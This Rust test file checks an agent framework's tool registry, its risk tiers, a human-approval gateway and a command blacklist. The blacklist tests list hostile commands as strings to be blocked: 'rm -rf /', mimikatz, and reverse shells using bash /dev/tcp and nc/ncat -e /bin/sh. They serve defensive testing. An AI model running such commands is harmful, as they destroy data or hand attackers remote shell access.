use kria_core::preprocessing::code::CodeProcessor;
use kria_core::safety::{BlacklistChecker, HitlGateway, PolicyEngine, RiskLevel};
/// Phase 3 — File & System Intelligence tests
///
/// Validates: file search tools, code intelligence tools, document tools,
/// clipboard tools, HITL/safety system, CodeProcessor, and project structure.
use kria_core::tools::registry;
use std::path::Path;

// ── 3.1 & 3.2: File tools registration ──────────────────────

#[test]
fn phase3_file_tools_registered() {
    let reg = registry::build_default_registry();
    // Original 12 file tools
    assert!(reg.get_def("read_file").is_some());
    assert!(reg.get_def("write_file").is_some());
    assert!(reg.get_def("list_directory").is_some());
    assert!(reg.get_def("search_files").is_some());
    assert!(reg.get_def("get_file_info").is_some());
    assert!(reg.get_def("calculate_dir_size").is_some());
    assert!(reg.get_def("create_directory").is_some());
    assert!(reg.get_def("copy_file").is_some());
    assert!(reg.get_def("rename_file").is_some());
    assert!(reg.get_def("delete_file").is_some());
    assert!(reg.get_def("delete_directory").is_some());
    assert!(reg.get_def("move_file").is_some());
    // Phase 3 enhanced tools
    assert!(reg.get_def("search_file_contents").is_some());
    assert!(reg.get_def("find_files_by_pattern").is_some());
    assert!(reg.get_def("get_project_structure").is_some());
}

#[test]
fn phase3_enhanced_file_search_category() {
    let reg = registry::build_default_registry();
    let def = reg.get_def("search_file_contents").unwrap();
    assert_eq!(def.category, "file_ops");
    assert_eq!(def.default_tier, RiskLevel::Green);
    assert!(def.parameters.len() >= 2); // directory + query
}

#[test]
fn phase3_find_files_has_filters() {
    let reg = registry::build_default_registry();
    let def = reg.get_def("find_files_by_pattern").unwrap();
    let param_names: Vec<&str> = def.parameters.iter().map(|p| p.name.as_str()).collect();
    assert!(param_names.contains(&"directory"));
    assert!(param_names.contains(&"pattern"));
    assert!(param_names.contains(&"min_size"));
    assert!(param_names.contains(&"max_size"));
    assert!(param_names.contains(&"type"));
}

#[test]
fn phase3_project_structure_schema() {
    let reg = registry::build_default_registry();
    let def = reg.get_def("get_project_structure").unwrap();
    let param_names: Vec<&str> = def.parameters.iter().map(|p| p.name.as_str()).collect();
    assert!(param_names.contains(&"path"));
    assert!(param_names.contains(&"max_depth"));
    assert!(param_names.contains(&"show_hidden"));
}

// ── 3.2: search_file_contents execution ──────────────────────

#[tokio::test]
async fn phase3_search_file_contents_finds_text() {
    let reg = registry::build_default_registry();
    let handler = reg.get_handler("search_file_contents").unwrap();
    // Search for "fn " in our own source crate
    let result = handler
        .execute(serde_json::json!({
            "directory": "src",
            "query": "pub fn register",
            "max_results": 5,
            "context_lines": 1,
        }))
        .await;
    assert!(result.success);
    let data = &result.data;
    assert!(data["count"].as_u64().unwrap() > 0);
    let first = &data["matches"][0];
    assert!(first["file"].as_str().unwrap().contains(".rs"));
    assert!(first["line"].as_u64().unwrap() > 0);
}

#[tokio::test]
async fn phase3_search_file_contents_case_insensitive() {
    let reg = registry::build_default_registry();
    let handler = reg.get_handler("search_file_contents").unwrap();
    // Search for "TOOLRESULT" (case-insensitive should match "ToolResult")
    let result = handler
        .execute(serde_json::json!({
            "directory": "src",
            "query": "TOOLRESULT",
            "max_results": 3,
        }))
        .await;
    assert!(result.success);
    let data = &result.data;
    assert!(data["count"].as_u64().unwrap() > 0);
}

// ── 3.2: get_project_structure execution ─────────────────────

#[tokio::test]
async fn phase3_project_structure_returns_tree() {
    let reg = registry::build_default_registry();
    let handler = reg.get_handler("get_project_structure").unwrap();
    let result = handler
        .execute(serde_json::json!({
            "path": "src",
            "max_depth": 2,
        }))
        .await;
    assert!(result.success);
    let data = &result.data;
    let tree = data["tree"].as_array().unwrap();
    assert!(!tree.is_empty());
    // Should find lib.rs or at least some entry
    let names: Vec<&str> = tree.iter().filter_map(|e| e["name"].as_str()).collect();
    assert!(names.contains(&"lib.rs") || !names.is_empty());
}

// ── 3.3: Code intelligence tools registered ──────────────────

#[test]
fn phase3_code_intelligence_tools_registered() {
    let reg = registry::build_default_registry();
    assert!(reg.get_def("count_lines_of_code").is_some());
    assert!(reg.get_def("diff_files").is_some());
    assert!(reg.get_def("find_todos").is_some());
    assert!(reg.get_def("analyze_code").is_some());
}

#[test]
fn phase3_code_tools_category() {
    let reg = registry::build_default_registry();
    for name in &[
        "count_lines_of_code",
        "diff_files",
        "find_todos",
        "analyze_code",
    ] {
        let def = reg.get_def(name).unwrap();
        assert_eq!(
            def.category, "code_intelligence",
            "tool {} should be in code_intelligence",
            name
        );
        assert_eq!(
            def.default_tier,
            RiskLevel::Green,
            "tool {} should be GREEN",
            name
        );
    }
}

// ── 3.3: CodeProcessor ───────────────────────────────────────

#[test]
fn phase3_code_processor_detect_language() {
    assert_eq!(CodeProcessor::detect_language(Path::new("main.rs")), "rust");
    assert_eq!(
        CodeProcessor::detect_language(Path::new("app.py")),
        "python"
    );
    assert_eq!(
        CodeProcessor::detect_language(Path::new("index.tsx")),
        "react"
    );
    assert_eq!(
        CodeProcessor::detect_language(Path::new("script.sh")),
        "shell"
    );
    assert_eq!(
        CodeProcessor::detect_language(Path::new("data.json")),
        "json"
    );
    assert_eq!(
        CodeProcessor::detect_language(Path::new("config.toml")),
        "toml"
    );
    assert_eq!(
        CodeProcessor::detect_language(Path::new("Makefile")),
        "unknown"
    );
}

#[test]
fn phase3_code_processor_analyze_rust_file() {
    // Analyze our own lib.rs
    let info = CodeProcessor::analyze(Path::new("src/lib.rs"));
    assert!(info.is_ok());
    let info = info.unwrap();
    assert_eq!(info.language, "rust");
    assert!(info.line_count > 0);
}

// ── 3.3: count_lines_of_code execution ──────────────────────

#[tokio::test]
async fn phase3_count_loc_returns_breakdown() {
    let reg = registry::build_default_registry();
    let handler = reg.get_handler("count_lines_of_code").unwrap();
    let result = handler
        .execute(serde_json::json!({
            "directory": "src",
        }))
        .await;
    assert!(result.success);
    let data = &result.data;
    assert!(data["total_files"].as_u64().unwrap() > 0);
    assert!(data["total_lines"].as_u64().unwrap() > 0);
    let breakdown = data["breakdown"].as_array().unwrap();
    // Should find "rust" in the breakdown
    let langs: Vec<&str> = breakdown
        .iter()
        .filter_map(|e| e["language"].as_str())
        .collect();
    assert!(langs.contains(&"rust"));
}

// ── 3.3: find_todos execution ───────────────────────────────

#[tokio::test]
async fn phase3_find_todos_works() {
    let reg = registry::build_default_registry();
    let handler = reg.get_handler("find_todos").unwrap();
    let result = handler
        .execute(serde_json::json!({
            "directory": "src",
            "max_results": 10,
        }))
        .await;
    assert!(result.success);
    let data = &result.data;
    // May or may not find TODOs, but should succeed
    assert!(data["count"].is_u64());
    assert!(data["items"].is_array());
}

// ── 3.3: analyze_code execution ─────────────────────────────

#[tokio::test]
async fn phase3_analyze_code_rust_file() {
    let reg = registry::build_default_registry();
    let handler = reg.get_handler("analyze_code").unwrap();
    let result = handler
        .execute(serde_json::json!({
            "path": "src/lib.rs",
        }))
        .await;
    assert!(result.success);
    let data = &result.data;
    assert_eq!(data["language"].as_str().unwrap(), "rust");
    assert!(data["line_count"].as_u64().unwrap() > 0);
}

// ── 3.4: Document tools registration ────────────────────────

#[test]
fn phase3_document_tools_registered() {
    let reg = registry::build_default_registry();
    assert!(reg.get_def("parse_document").is_some());
    assert!(reg.get_def("parse_csv").is_some());
    assert!(reg.get_def("summarize_document").is_some());
}

#[test]
fn phase3_document_tools_green_tier() {
    let reg = registry::build_default_registry();
    for name in &["parse_document", "parse_csv", "summarize_document"] {
        let def = reg.get_def(name).unwrap();
        assert_eq!(def.default_tier, RiskLevel::Green);
        assert_eq!(def.category, "documents");
    }
}

// ── 3.5: Safety / HITL system ───────────────────────────────

#[test]
fn phase3_policy_classifies_read_as_green() {
    let policy = PolicyEngine::new();
    let decision = policy.evaluate("read_file", &serde_json::json!({ "path": "/tmp/test.txt" }));
    assert_eq!(decision.risk_level, RiskLevel::Green);
    assert!(!decision.requires_approval);
    assert!(!decision.blocked);
}

#[test]
fn phase3_policy_classifies_delete_as_red() {
    let policy = PolicyEngine::new();
    let decision = policy.evaluate(
        "delete_file",
        &serde_json::json!({ "path": "/tmp/test.txt" }),
    );
    assert_eq!(decision.risk_level, RiskLevel::Red);
    assert!(decision.requires_approval);
}

#[test]
fn phase3_policy_escalates_protected_paths() {
    let policy = PolicyEngine::new();
    // Writing to /etc should escalate to RED
    let decision = policy.evaluate("write_file", &serde_json::json!({ "path": "/etc/hosts" }));
    assert_eq!(decision.risk_level, RiskLevel::Red);
    assert!(decision.requires_approval);
}

#[test]
fn phase3_blacklist_blocks_dangerous_commands() {
    let checker = BlacklistChecker::new();
    // rm -rf /
    assert!(checker.is_blocked("rm -rf /"));
    // mimikatz
    assert!(checker.is_blocked("mimikatz"));
    // Normal command should pass
    assert!(!checker.is_blocked("ls -la /tmp"));
}

#[test]
fn phase3_blacklist_blocks_reverse_shell() {
    let checker = BlacklistChecker::new();
    assert!(checker.is_blocked("bash -i >& /dev/tcp/10.0.0.1/4444"));
    assert!(checker.is_blocked("nc -l -e /bin/sh"));
    assert!(checker.is_blocked("ncat -e /bin/sh 10.0.0.1 4444"));
}

#[tokio::test]
async fn phase3_hitl_gateway_creates() {
    let hitl = HitlGateway::new(30);
    assert_eq!(hitl.pending_requests().await.len(), 0);
}

// ── 3.6: Clipboard tools ────────────────────────────────────

#[test]
fn phase3_clipboard_tools_registered() {
    let reg = registry::build_default_registry();
    assert!(reg.get_def("get_clipboard").is_some());
    assert!(reg.get_def("set_clipboard").is_some());
    assert!(reg.get_def("transform_clipboard").is_some());
    assert!(reg.get_def("screenshot").is_some());
    assert!(reg.get_def("type_text").is_some());
}

#[test]
fn phase3_clipboard_risk_tiers() {
    let reg = registry::build_default_registry();
    // Read-only = green
    assert_eq!(
        reg.get_def("get_clipboard").unwrap().default_tier,
        RiskLevel::Green
    );
    assert_eq!(
        reg.get_def("transform_clipboard").unwrap().default_tier,
        RiskLevel::Green
    );
    // Write = yellow
    assert_eq!(
        reg.get_def("set_clipboard").unwrap().default_tier,
        RiskLevel::Yellow
    );
    assert_eq!(
        reg.get_def("type_text").unwrap().default_tier,
        RiskLevel::Yellow
    );
}

// ── Registry completeness ───────────────────────────────────

#[test]
fn phase3_total_tool_count() {
    let reg = registry::build_default_registry();
    // Phase 0: ~25 system tools, Phase 1: 8 knowledge, Phase 2: 14 internet,
    // Phase 3: +7 file/code tools, updated docs
    // Total should be well above 60
    assert!(
        reg.len() >= 60,
        "Expected at least 60 tools, got {}",
        reg.len()
    );
}

#[test]
fn phase3_categories_include_code_intelligence() {
    let reg = registry::build_default_registry();
    let cats = reg.categories();
    assert!(cats.contains(&"code_intelligence".to_string()));
    assert!(cats.contains(&"file_ops".to_string()));
    assert!(cats.contains(&"documents".to_string()));
    assert!(cats.contains(&"interaction".to_string()));
    assert!(cats.contains(&"internet".to_string()));
}
